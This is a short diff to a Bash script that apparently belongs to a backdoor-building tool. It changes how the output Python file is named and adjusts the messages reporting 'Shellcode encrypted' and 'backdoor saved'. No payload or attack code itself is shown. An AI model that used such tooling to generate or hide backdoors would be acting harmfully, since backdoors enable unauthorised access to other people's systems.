@@ -22,12 +22,11 @@ echo ""
 cat temp.txt > $(basename $pyfile)
 echo '' >> $(basename $pyfile)
 cat $pyfile >> $(basename $pyfile)
-mv $(basename $pyfile) nothing.py
 sleep 0.5
 echo "[ + ] Shellcode encrypted ..." | pv -qL 10
 echo ""
 sleep 1
-echo "[ + ] backdoor saved in folder --> $PWD/nothing.py" | pv -qL 10
+echo "[ + ] backdoor saved in folder --> $PWD/$(basename $pyfile)" | pv -qL 10
 echo ""
 sleep 1.5
 echo "[ + ] Cleaning up ... " | pv -qL 10
